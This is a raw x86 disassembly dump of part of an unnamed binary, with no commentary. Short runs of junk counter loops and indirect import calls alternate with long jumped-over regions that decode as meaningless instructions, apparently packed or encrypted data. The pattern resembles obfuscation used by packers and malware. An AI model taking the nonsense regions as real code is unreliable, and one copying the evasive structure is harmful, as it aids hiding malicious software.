  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0x8ffdd70b
  4095d3:	out    0x6c,al
  4095d5:	fnstcw WORD PTR [esi+0x7e]
  4095d8:	jp     0x409657
  4095da:	jle    0x40965a
  4095dc:	lds    ebp,FWORD PTR [ebp-0x2b]
  4095df:	(bad)  
  4095e1:	rcl    BYTE PTR [esi-0x7c],cl
  4095e4:	mov    ah,0x4
  4095e6:	mov    ah,0x49
  4095e8:	add    al,0xed
  4095ea:	scas   al,BYTE PTR es:[edi]
  4095eb:	hlt    
  4095ec:	mov    ecx,0x816afc17
  4095f1:	fisubr WORD PTR [ebp-0x54]
  4095f4:	sti    
  4095f5:	sar    BYTE PTR [esi*4-0x38c611cc],1
  4095fc:	pop    ebx
  4095fd:	imul   ecx,DWORD PTR [edi+0x101e2186],0xffffff90
  409604:	push   edx
  409605:	daa    
  409606:	push   esi
  409607:	je     0x409688
  409609:	sbb    eax,0x791d1b6e
  40960e:	je     0x4095f0
  409610:	cmp    eax,0xfe0e22da
  409615:	popa   
  409616:	(bad)  
  409617:	mov    cl,0x3
  409619:	das    
  40961a:	mov    ah,0x22
  40961c:	add    DWORD PTR [eax-0x720dc10b],eax
  409622:	adc    eax,0xe11b7b66
  409627:	aam    0x83
  409629:	pop    es
  40962a:	fidiv  DWORD PTR [eax+edi*4+0x40]
  40962e:	adc    al,bh
  409630:	pop    es
  409631:	cli    
  409632:	and    esp,DWORD PTR [esi+0x74d2cdd5]
  409638:	dec    esp
  409639:	sub    al,BYTE PTR [ebp+ecx*8-0x6e]
  40963d:	retf   
  40963e:	add    DWORD PTR [edx+0x1],ecx
  409641:	aas    
  409642:	in     eax,0x6f
  409644:	push   ecx
  409645:	inc    ecx
  409646:	xor    DWORD PTR [eax+edi*2+0x56d258f9],ebx
  40964d:	jno    0x4095f8
  40964f:	int    0x86
  409651:	sbb    bl,BYTE PTR [ecx]
  409653:	xchg   esi,eax
  409654:	in     al,0x7b
  409656:	cld    
  409657:	test   BYTE PTR [eax+edx*1+0x2130595],al
  40965e:	cs xchg ebx,eax
  409660:	jo     0x4096b2
  409662:	jge    0x409615
  409664:	nop
  409665:	jb     0x409632
  409667:	fstp   DWORD PTR [eax-0x1f]
  40966a:	and    eax,ebx
  40966c:	into   
  40966d:	mov    WORD PTR [ebx],ds
  40966f:	lods   al,BYTE PTR ds:[esi]
  409670:	xor    eax,0xe408e4e
  409675:	aaa    
  409676:	jbe    0x4096c2
  409678:	jnp    0x40966f
  40967a:	fstp   DWORD PTR [edx-0x6ba48417]
  409680:	sub    dl,bh
  409682:	adc    DWORD PTR [eax],esp
  409684:	das    
  409685:	aad    0x67
  409687:	inc    edx
  409688:	es imul esi,esp,0xffffffcb
  40968c:	mov    al,cl
  40968e:	push   es
  40968f:	and    al,BYTE PTR [edi+0x57d7f21c]
  409695:	pop    ds
  409696:	xor    eax,0x87a07f6a
  40969b:	or     BYTE PTR [edi-0x71451590],ah
  4096a1:	mov    ds:0x5bb70231,al
  4096a6:	push   edi
  4096a7:	retf   
  4096a8:	leave  
  4096a9:	div    BYTE PTR [ecx]
  4096ab:	retf   0x7752
  4096ae:	xlat   BYTE PTR ds:[ebx]
  4096af:	add    BYTE PTR [ecx+esi*4+0x643b93ca],dh
  4096b6:	aad    0x3d
  4096b8:	es jbe 0x4096c4
  4096bb:	cld    
  4096bc:	adc    BYTE PTR [edi-0x3a17a169],bl
  4096c2:	add    edx,DWORD PTR [edx+0x1db2a9e6]
  4096c8:	ret    0x7384
  4096cb:	jb     0x40973f
  4096cd:	add    al,0xcf
  4096cf:	xor    ebx,DWORD PTR [eax-0x3c]
  4096d2:	pop    ebp
  4096d3:	mov    ds:0xab685aef,al
  4096d8:	xor    BYTE PTR [ebp-0x248cf380],dh
  4096de:	cmp    al,0x64
  4096e0:	sbb    DWORD PTR [edi+0x38],ecx
  4096e3:	mov    al,BYTE PTR [edi]
  4096e5:	jno    0x4096f4
  4096e7:	repnz mov ds:0xefe7d9c5,al
  4096ed:	cmp    bh,ah
  4096ef:	int    0x81
  4096f1:	xchg   edi,eax
  4096f2:	or     DWORD PTR [esi-0x7d8f5319],edi
  4096f8:	ins    DWORD PTR es:[edi],dx
  4096f9:	scas   eax,DWORD PTR es:[edi]
  4096fa:	dec    ebx
  4096fc:	nop
  4096fd:	or     DWORD PTR [ebp-0x776f8a36],esp
  409703:	iret   
  409704:	push   edi
  409705:	icebp  
  409706:	int3   
  409707:	adc    eax,0xcdb22377
  40970c:	out    0xf6,al
  40970e:	retf   
  40970f:	cmp    eax,0x4dbf8611
  409714:	aas    
  409715:	(bad)  
  409716:	xor    cl,BYTE PTR [ebp+0x6092ac1b]
  40971c:	or     ebp,DWORD PTR [ecx-0x502ade04]
  409722:	idiv   DWORD PTR [eax]
  409724:	lods   eax,DWORD PTR ds:[esi]
  409725:	out    dx,al
  409726:	retf   0x6f72
  409729:	sbb    ecx,DWORD PTR [eax+ebp*8-0x47]
  40972d:	adc    al,0x2c
  40972f:	and    BYTE PTR es:0xfac72c58,0xaf
  409737:	out    0x7d,al
  409739:	mov    edi,0xc943761a
  40973e:	push   esp
  40973f:	pop    ds
  409740:	(bad)
  409744:	jns    0x4097a9
  409746:	out    0x65,eax
  409748:	xor    DWORD PTR [ebx+eax*1-0x52],0xffffff9c
  40974d:	mov    eax,0x8d6d5329
  409752:	gs rol eax,cl
  409755:	rcl    BYTE PTR [ebx-0x63],cl
  409758:	mov    edx,0x6517457a
  40975d:	sti    
  40975e:	sbb    eax,0xe2c470a5
  409763:	fcomp  QWORD PTR [edi]
  409765:	sbb    ah,BYTE PTR [edx+0x74]
  409768:	rcr    edx,cl
  40976a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40976b:	bound  ecx,QWORD PTR [edx]
  40976d:	xchg   ebx,eax
  40976e:	inc    eax
  40976f:	iret   
  409770:	scas   eax,DWORD PTR es:[edi]
  409771:	mov    cl,0x80
  409773:	mov    bl,0xb9
  409775:	int3   
  409776:	jge    0x409732
  409778:	test   BYTE PTR [ecx],0xde
  40977b:	lods   al,BYTE PTR ds:[esi]
  40977c:	loop   0x409719
  40977e:	frstor [edx+0x56]
  409781:	and    eax,0x537530f2
  409786:	ss ret 0xcd21
  40978a:	adc    al,0xb7
  40978c:	(bad)
  40978f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409790:	test   BYTE PTR [eax],dl
  409792:	inc    edi
  409793:	mov    eax,0x28c9f000
  409798:	pop    eax
  409799:	add    DWORD PTR [edi+0x7a],ecx
  40979c:	outs   dx,BYTE PTR ds:[esi]
  40979d:	pop    ecx
  40979e:	xchg   ecx,eax
  40979f:	mov    al,ds:0xe2d50826
  4097a4:	outs   dx,BYTE PTR ds:[esi]
  4097a5:	int    0xb4
  4097a7:	ret    0x86b3
  4097aa:	inc    ebx
  4097ab:	dec    eax
  4097ac:	daa    
  4097ad:	push   ecx
  4097ae:	sbb    dl,BYTE PTR [edi-0x55a2c691]
  4097b4:	pop    ecx
  4097b5:	sbb    BYTE PTR [ebp-0x7b8c11ac],0x9b
  4097bc:	adc    ebp,0x4d
  4097bf:	mov    BYTE PTR ds:0xf82d8107,dh
  4097c5:	jmp    0x75ad:0xb029a45c
  4097cc:	mov    ds:0xea17b8b4,eax
  4097d1:	or     edi,edx
  4097d3:	sub    DWORD PTR [edx+0x152fb98c],edx
  4097d9:	fldenv [esi-0x67372270]
  4097df:	and    ebp,esi
  4097e1:	jns    0x409800
  4097e3:	mov    ah,0xfe
  4097e5:	cmp    eax,0xe637e126
  4097ea:	push   ds
  4097eb:	leave  
  4097ec:	lods   al,BYTE PTR ds:[esi]
  4097ed:	adc    BYTE PTR [edx-0x22],bh
  4097f0:	push   eax
  4097f1:	pop    ebx
  4097f2:	cmc    
  4097f3:	jno    0x4097dc
  4097f5:	stos   BYTE PTR es:[edi],al
  4097f6:	les    esi,FWORD PTR [eax]
  4097f8:	dec    ecx
  4097f9:	mov    al,ds:0xe0e43db5
  4097fe:	jge    0x4097f0
  409800:	fcomi  st,st(6)
  409802:	push   ss
  409803:	into   
  409804:	sub    al,0x48
  409806:	ins    BYTE PTR es:[edi],dx
  409807:	xchg   BYTE PTR [edx-0x59],ch
  40980a:	cmp    BYTE PTR [edi+edx*2],cl
  40980d:	(bad)  
  40980f:	adc    eax,0xfcabff09
  409814:	(bad)  
  409815:	inc    ecx
  409816:	push   0x42
  409818:	mov    ebp,DWORD PTR [eax+0x73c37453]
  40981e:	cmp    eax,0x92d20ed0
  409823:	add    al,0x55
  409825:	test   al,0xd0
  409827:	jp     0x409812
  409829:	iret   
  40982a:	popf   
  40982b:	popa   
  40982c:	xor    BYTE PTR ds:0x80f6f137,al
  409832:	pop    edx
  409833:	lods   eax,DWORD PTR ds:[esi]
  409834:	xchg   DWORD PTR [ecx],ecx
  409836:	test   DWORD PTR [ebx-0x54],esp
  409839:	ficomp WORD PTR [edi+0x47]
  40983c:	fist   WORD PTR [esi+ecx*8+0x50]
  409840:	mov    eax,ds:0x21abe837
  409845:	pop    edi
  409846:	out    dx,eax
  409847:	ins    DWORD PTR es:[edi],dx
  409848:	and    DWORD PTR [ebp-0x72b7a30],0x999ccb0a
  409852:	(bad)  
  409853:	and    al,0xc9
  409855:	mov    edx,0x50e6ce9b
  40985a:	ins    BYTE PTR es:[edi],dx
  40985b:	je     0x40987f
  40985d:	xor    BYTE PTR [ecx],ah
  40985f:	jb     0x40988d
  409861:	inc    esi
  409862:	fwait
  409863:	imul   ecx,esp,0xb903e372
  409869:	mov    dh,0x22
  40986b:	hlt    
  40986c:	fld    DWORD PTR [eax+0x4d]
  40986f:	mov    cl,0x9d
  409871:	or     eax,0x13a5033
  409876:	mov    bh,cl
  409878:	ficomp DWORD PTR [edi]
  40987a:	cmp    DWORD PTR [edi],0x70
  40987d:	pusha  
  40987e:	xchg   edi,eax
  40987f:	fdivrp st(7),st
  409881:	mov    dl,0xbe
  409883:	xchg   ebp,eax
  409884:	lds    ebp,FWORD PTR [eax]
  409886:	mov    BYTE PTR [edi],0xf0
  409889:	or     al,0x2c
  40988b:	jmp    0x87edb1fd
  409890:	sbb    ch,0xe1
  409893:	pop    es
  409894:	pop    edx
  409895:	mov    bh,0xe5
  409897:	ret    0x983c
  40989a:	pop    ebx
  40989b:	push   esp
  40989c:	in     al,dx
  40989d:	lahf   
  40989e:	inc    ecx
  40989f:	mov    dl,0x1b
  4098a1:	fist   DWORD PTR [edi-0x5626b126]
  4098a7:	sub    ecx,ebp
  4098a9:	mov    edi,0x6427f02e
  4098ae:	fldcw  WORD PTR [ebx-0x3f]
  4098b1:	sahf   
  4098b2:	fidiv  WORD PTR [ebp-0x38]
  4098b5:	push   edx
  4098b6:	jl     0x40984b
  4098b8:	js     0x409929
  4098ba:	sub    BYTE PTR [edi-0x9],ch
  4098bd:	sbb    al,0xed
  4098bf:	fcomp  QWORD PTR [edx]
  4098c1:	jl     0x4098b6
  4098c3:	sub    eax,0x9bdf8592
  4098c8:	mov    ds:0x172320d4,al
  4098cd:	pop    edx
  4098ce:	adc    al,BYTE PTR [eax-0x5]
  4098d1:	cli    
  4098d2:	inc    esp
  4098d3:	outs   dx,BYTE PTR ds:[esi]
  4098d4:	into   
  4098d5:	idiv   BYTE PTR [esi+0x42]
  4098d8:	fistp  QWORD PTR [ecx+0x62]
  4098db:	pop    es
  4098dc:	clc    
  4098dd:	shl    bl,0x6b
  4098e0:	movzx  ecx,cx
  4098e3:	sbb    DWORD PTR ds:0x43383b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4337a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433737
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43376f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43376f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43376f,ecx
  409918:	cmp    DWORD PTR ds:0x43376f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43376f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4337a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4337a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4337a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4338a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4337a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4337a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4337a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4337a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4337a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fstp   QWORD PTR [edx]
  4099be:	mov    eax,0xe468dfa3
  4099c3:	jle    0x409a43
  4099c5:	jp     0x409a44
  4099c7:	jle    0x409a47
  4099c9:	dec    ecx
  4099ca:	inc    edx
  4099cb:	xchg   ebp,eax
  4099cc:	mov    ah,0x23
  4099ce:	mov    esi,0x7e91f846
  4099d3:	or     DWORD PTR [eax+edx*2+0x1b],ebp
  4099d7:	push   ebx
  4099d8:	adc    ecx,DWORD PTR [esi+0x5e632e6f]
  4099de:	push   edx
  4099df:	popf   
  4099e0:	dec    ebx
  4099e1:	and    DWORD PTR [ebp+0x8],0x2942947
  4099e8:	jae    0x409970
  4099ea:	imul   eax,DWORD PTR [ebx],0xca28feb5
  4099f0:	inc    ebx
  4099f1:	or     eax,0xaf710968
  4099f6:	std    
  4099f7:	ficomp DWORD PTR [ecx]
  4099f9:	sbb    edx,ebp
  4099fb:	(bad)  
  4099fc:	pop    ss
  4099fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099fe:	repnz mov cl,0xfe
  409a01:	mov    edi,0x1d00582f
  409a06:	test   al,0xce
  409a08:	int    0x73
  409a0a:	mov    ch,0xf7
  409a0c:	mov    esp,0xa49eeab5
  409a11:	(bad)  
  409a13:	(bad)
  409a16:	mov    BYTE PTR [ebx],0x10
  409a19:	mov    edi,0x6e2a13f4
  409a1e:	xchg   esi,eax
  409a1f:	imul   edi,ebx,0x9241e2a
  409a25:	hlt    
  409a26:	(bad)  
  409a27:	sahf   
  409a28:	xor    DWORD PTR [ebx-0x32a342ce],esp
  409a2e:	inc    ebx
  409a2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a30:	fstp   QWORD PTR [ecx+0x12]
  409a33:	mov    ecx,0x485736c3
  409a38:	lds    ecx,FWORD PTR [edi]
  409a3a:	in     al,dx
  409a3b:	add    bh,BYTE PTR [ebx+ecx*2-0x72]
  409a3f:	jge    0x409abe
  409a41:	mov    al,0xda
  409a43:	xor    ch,cl
  409a45:	ds cmp esi,esi
  409a48:	cmp    al,BYTE PTR [ebx+0x51]
  409a4b:	rcl    ah,cl
  409a4d:	mov    ebp,0x13b35396
  409a52:	add    BYTE PTR [eax-0x75],dl
  409a55:	in     al,0x17
  409a57:	(bad)  
  409a58:	retf   
  409a59:	imul   esp,DWORD PTR es:[edi+0x4c],0xae848a30
  409a61:	sbb    cl,BYTE PTR [ebx-0x316f31e1]
  409a67:	dec    esp
  409a68:	out    0x8f,eax
  409a6a:	leave  
  409a6b:	xchg   esi,eax
  409a6c:	repnz pop esi
  409a6e:	mov    WORD PTR [esi+0x737c0257],cs
  409a74:	xchg   edx,eax
  409a75:	jbe    0x409a80
  409a77:	imul   ecx,DWORD PTR [ebp-0x25],0xffffffde
  409a7b:	push   cs
  409a7c:	dec    eax
  409a7d:	sbb    DWORD PTR [ebp-0x4f],eax
  409a80:	sbb    al,0xd
  409a82:	pop    ebx
  409a83:	stos   DWORD PTR es:[edi],eax
  409a84:	and    DWORD PTR [edx+eiz*2+0x32703304],esi
  409a8b:	mov    ebx,0x79ad77ec
  409a90:	aas    
  409a91:	or     dh,BYTE PTR [edx+0xb]
  409a94:	pop    ss
  409a95:	jle    0x409adf
  409a97:	cmp    BYTE PTR [ebx+ebp*2-0x269fb2de],ah
  409a9e:	test   eax,0xcf8b6475
  409aa3:	mov    bl,0xe6
  409aa5:	push   0xf41b6ca2
  409aaa:	(bad)  
  409aab:	xor    al,BYTE PTR fs:[ecx]
  409aae:	inc    esp
  409aaf:	sti    
  409ab0:	clc    
  409ab1:	jns    0x409acb
  409ab3:	fisub  DWORD PTR [edx-0x72487c4c]
  409ab9:	xor    esi,DWORD PTR gs:[esi+0xd]
  409abd:	repz xchg ebp,eax
  409abf:	ret    0x3353
  409ac2:	sub    bl,BYTE PTR [ebx+0x2e]
  409ac5:	in     al,dx
  409ac6:	js     0x409afe
  409ac8:	out    dx,eax
  409ac9:	jne    0x409a96
  409acb:	ins    BYTE PTR es:[edi],dx
  409acc:	mov    ds:0xef6a60c7,eax
  409ad1:	(bad)  
  409ad2:	push   es
  409ad3:	fwait
  409ad4:	call   0x84166af9
  409ad9:	test   eax,0x6ecdb77a
  409ade:	adc    edx,DWORD PTR [eax-0x44fe2683]
  409ae4:	cli    
  409ae5:	xchg   bl,cl
  409ae7:	and    al,0x49
  409ae9:	pop    ss
  409aea:	xchg   edi,eax
  409aeb:	outs   dx,DWORD PTR ds:[esi]
  409aec:	push   edx
  409aed:	adc    dh,BYTE PTR [eax-0x27]
  409af0:	sti    
  409af1:	ret    0xc6cc
  409af4:	stos   BYTE PTR es:[edi],al
  409af5:	xor    cl,bh
  409af7:	jle    0x409b58
  409af9:	call   0x6f41f7e0
  409afe:	clc    
  409aff:	(bad)  
  409b00:	fild   WORD PTR ds:0x84488fc7
  409b06:	and    eax,0xfa4e4a57
  409b0b:	mov    bh,0xc7
  409b0d:	(bad)  
  409b0e:	xor    al,0x96
  409b10:	xor    ecx,edx
  409b12:	sbb    al,0x8d
  409b14:	pop    edi
  409b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b16:	sbb    DWORD PTR [ebp+edi*1-0x84670cd],ebp
  409b1d:	gs jle 0x409aa0
  409b20:	scas   eax,DWORD PTR es:[edi]
  409b21:	jmp    0x2d60:0x4357586
  409b28:	fst    DWORD PTR es:[ebp+0x10]
  409b2c:	xchg   BYTE PTR [esi+0xa],cl
  409b2f:	jns    0x409b5b
  409b31:	int3   
  409b32:	mov    dl,0x7b
  409b34:	lods   al,BYTE PTR ds:[esi]
  409b35:	xor    al,0xad
  409b37:	or     DWORD PTR [edx-0x6e3a0ddc],0x12
  409b3e:	pop    ecx
  409b3f:	jp     0x409b3b
  409b41:	sub    dh,BYTE PTR [edx-0x76]
  409b44:	shl    BYTE PTR [ecx-0x7436186b],1
  409b4a:	(bad)  [esi-0x41d35f51]
  409b50:	fldcw  WORD PTR gs:[esi-0x19]
  409b54:	jns    0x409b9e
  409b56:	xchg   edi,eax
  409b57:	xchg   dh,ch
  409b59:	(bad)  
  409b5a:	ds pop ecx
  409b5c:	adc    BYTE PTR ds:[ecx+0x150bf8e0],cl
  409b63:	inc    ebp
  409b64:	cmp    BYTE PTR [edi+0x0],cl
  409b67:	imul   edx,esi,0x4e3854c2
  409b6d:	xor    cl,al
  409b6f:	xlat   BYTE PTR ds:[ebx]
  409b70:	cld    
  409b71:	xchg   ebp,eax
  409b72:	or     dh,al
  409b74:	sbb    DWORD PTR [edx+ebp*2-0x4ce33d7b],ebp
  409b7b:	push   ds
  409b7c:	loopne 0x409b2c
  409b7e:	and    DWORD PTR [ebx+0xb2ccdf0],edi
  409b84:	xchg   ebx,eax
  409b85:	xchg   ebp,eax
  409b86:	pop    ebx
  409b87:	cmp    BYTE PTR [eax+edx*4-0x667c43d8],0xb9
  409b8f:	fst    QWORD PTR [esi+ebx*8+0x32cce0c]
  409b96:	xor    dh,BYTE PTR [esi-0x10efab74]
  409b9c:	jae    0x409bf2
  409b9e:	jecxz  0x409c11
  409ba0:	pop    esp
  409ba1:	sbb    DWORD PTR [eax-0x1e6d7e40],0x45
  409ba8:	jmp    0x81018aa2
  409bad:	out    0x9a,eax
  409baf:	jmp    0x2186:0x285d1d18
  409bb6:	les    esi,FWORD PTR [ebx+0x41481ff4]
  409bbc:	jns    0x409b9b
  409bbe:	jo     0x409b61
  409bc0:	pop    ebx
  409bc1:	data16 (bad) 
  409bc3:	push   eax
  409bc4:	xor    esp,DWORD PTR [ebx-0x44fd06b6]
  409bca:	jge    0x409b99
  409bcc:	(bad)
  409bd0:	sbb    eax,DWORD PTR [edi+0x1b40d224]
  409bd6:	add    eax,0xa6d074fe
  409bdb:	stos   BYTE PTR es:[edi],al
  409bdc:	icebp  
  409bdd:	cmp    ch,BYTE PTR [ebx]
  409bdf:	cmp    DWORD PTR [esi-0x6b1be5c5],esp
  409be5:	adc    dl,BYTE PTR [esi]
  409be7:	xor    DWORD PTR [ecx+eax*8],ecx
  409bea:	mov    esi,0xd99586fe
  409bef:	xchg   ebx,eax
  409bf0:	stos   DWORD PTR es:[edi],eax
  409bf1:	sbb    DWORD PTR [edi-0xcb9594c],edi
  409bf7:	fwait
  409bf8:	mov    dh,BYTE PTR [eax]
  409bfa:	mov    dh,0xea
  409bfc:	adc    al,0x3f
  409bfe:	pushf  
  409bff:	jg     0x409c18
  409c01:	mov    DWORD PTR [edi+0x51],ecx
  409c04:	and    al,0x55
  409c06:	call   0xe7c32f71
  409c0b:	fstp   TBYTE PTR [edx]
  409c0d:	in     eax,0x57
  409c0f:	rcr    DWORD PTR [ebp+0x3626242],1
  409c15:	fist   DWORD PTR [ecx+0x599fabb0]
  409c1b:	adc    BYTE PTR [ebx-0xb216a77],dh
  409c21:	xor    DWORD PTR [edi+0x1da0f22d],esp
  409c27:	jl     0x409bf0
  409c29:	loope  0x409c05
  409c2b:	add    DWORD PTR [edi-0x86840ae],edi
  409c31:	jb     0x409c0e
  409c33:	pop    esi
  409c34:	add    eax,0xe7b38b42
  409c39:	add    al,al
  409c3b:	push   ecx
  409c3c:	cmp    BYTE PTR [eax-0x7e],0xde
  409c40:	(bad)  
  409c41:	hlt    
  409c42:	sar    DWORD PTR [ecx+0x24],0x8
  409c46:	sbb    DWORD PTR [edi+0x2893295e],esi
  409c4c:	sub    BYTE PTR [ecx-0x14],cl
  409c4f:	sub    ch,BYTE PTR [ebx+0x11]
  409c52:	pop    ecx
  409c53:	sbb    WORD PTR [ebx],0x20
  409c57:	lea    ebx,[ebx]
  409c59:	(bad)  
  409c5a:	jno    0x409c8b
  409c5c:	mov    ds:0x5f659b73,eax
  409c61:	xchg   BYTE PTR [edx-0x24],al
  409c64:	mov    BYTE PTR [esi-0x23a56456],cl
  409c6a:	ins    DWORD PTR es:[edi],dx
  409c6b:	cmp    al,0xf8
  409c6d:	retf   0x7d56
  409c70:	sbb    BYTE PTR [edi-0x34],0x66
  409c74:	jl     0x409c92
  409c76:	test   DWORD PTR [ebx-0x80],edi
  409c79:	sti    
  409c7a:	icebp  
  409c7b:	daa    
  409c7c:	adc    DWORD PTR [ebp+0x2c9114d7],ebx
  409c82:	arpl   WORD PTR [eax-0xfdfab53],bx
  409c88:	fadd   DWORD PTR [ebp-0x3a]
  409c8b:	lods   eax,DWORD PTR ds:[esi]
  409c8c:	mov    ds:0x249231a3,al
  409c91:	xlat   BYTE PTR ds:[ebx]
  409c92:	jmp    0x4f2f:0x245d178e
  409c99:	mov    eax,0x585d9ada
  409c9e:	pop    ecx
  409c9f:	push   eax
  409ca0:	sub    al,0x74
  409ca2:	cmp    DWORD PTR [ebx],0xffffffec
  409ca5:	(bad)  
  409ca6:	sbb    eax,0xc248b9dc
  409cab:	xor    esp,DWORD PTR [edi]
  409cad:	enter  0x9586,0x9c
  409cb1:	fs jge 0x409cd4
  409cb4:	jae    0x409c8f
  409cb6:	mov    ebx,eax
  409cb8:	inc    eax
  409cb9:	popa   
  409cba:	adc    BYTE PTR [eax],cl
  409cbc:	adc    eax,0x1c0c70fd
  409cc1:	sub    eax,0x15ee6001
  409cc6:	jp     0x409d03
  409cc8:	ror    cl,cl
  409cca:	ror    BYTE PTR [edx],1
  409ccc:	ins    DWORD PTR es:[edi],dx
  409ccd:	jne    0x40a399
  409cd3:	mov    eax,DWORD PTR [ebp+0x8]
  409cd6:	mov    ecx,DWORD PTR [ebp-0x18]
  409cd9:	xor    eax,esi
  409cdb:	add    eax,edi
  409cdd:	cmp    DWORD PTR [ecx],eax
  409cdf:	jne    0x40a344
  409ce5:	mov    eax,DWORD PTR [ebp+0x8]
  409ce8:	jmp    0x40a009
  409ced:	inc    edi
  409cee:	aad    0xe6
  409cf0:	shl    BYTE PTR [ecx+esi*8+0x71],1
  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	ret    0xcc90
  409cfc:	shl    DWORD PTR [ebx+eiz*8+0x7e],cl
  409d00:	jle    0x409d7c
  409d02:	jge    0x409d82
  409d04:	jle    0x409d37
  409d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d07:	push   0xa42054f6
  409d0c:	sub    ecx,DWORD PTR [ecx+esi*1]
  409d0f:	mov    ebx,0x17095e4c
  409d14:	cdq    
  409d15:	lahf   
  409d16:	fwait
  409d17:	in     eax,0x12
  409d19:	push   edx
  409d1a:	icebp  
  409d1b:	aad    0xf5
  409d1d:	cmp    BYTE PTR [eax+0x39],dl
  409d20:	sub    eax,edx
  409d22:	and    eax,0xfcdaf111
  409d27:	jecxz  0x409d43
  409d29:	and    eax,0x700a244c
  409d2e:	or     al,0xc9
  409d30:	(bad)
  409d34:	ins    DWORD PTR es:[edi],dx
  409d35:	xchg   ebp,eax
  409d36:	cmp    eax,0xa607b605
  409d3b:	push   ds
  409d3c:	popa   
  409d3d:	xor    ecx,DWORD PTR [esi]
  409d3f:	push   ebx
  409d40:	push   edx
  409d41:	test   al,0x4d
  409d43:	sub    ebp,DWORD PTR [eax-0x2ac179d2]
  409d49:	jmp    0x409da7
  409d4b:	pop    es
  409d4c:	mov    BYTE PTR [edx+0x6d],cl
  409d4f:	mov    eax,DWORD PTR [edi+0x36bfb9ae]
  409d55:	std    
  409d56:	daa    
  409d57:	test   eax,esp
  409d59:	(bad)  
  409d5b:	repnz mov ah,0x73
  409d5e:	jp     0x409dcf
  409d60:	fiadd  DWORD PTR [ecx+eiz*2-0x7]
  409d64:	(bad)  
  409d65:	and    eax,0xb3251c1d
  409d6a:	mov    bh,BYTE PTR [edx]
  409d6c:	dec    esp
  409d6d:	and    BYTE PTR [esp+esi*4-0x65],bh
  409d71:	pop    eax
  409d72:	rcr    BYTE PTR [eax],cl
  409d74:	nop
  409d75:	ret    
  409d76:	inc    esi
  409d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d78:	outs   dx,BYTE PTR ds:[esi]
  409d79:	add    ecx,DWORD PTR [edi+0x47]
  409d7c:	dec    ebx
  409d7d:	(bad)
  409d80:	adc    al,BYTE PTR [ecx-0x36]
  409d83:	fisttp WORD PTR [ebx+0x6f]
  409d86:	add    BYTE PTR [ecx-0x2],dl
  409d89:	add    esp,DWORD PTR [edi+0x1c685beb]
  409d8f:	push   ebx
  409d90:	fiadd  DWORD PTR [ebp+0x64]
  409d93:	aad    0xd4
  409d95:	inc    ecx
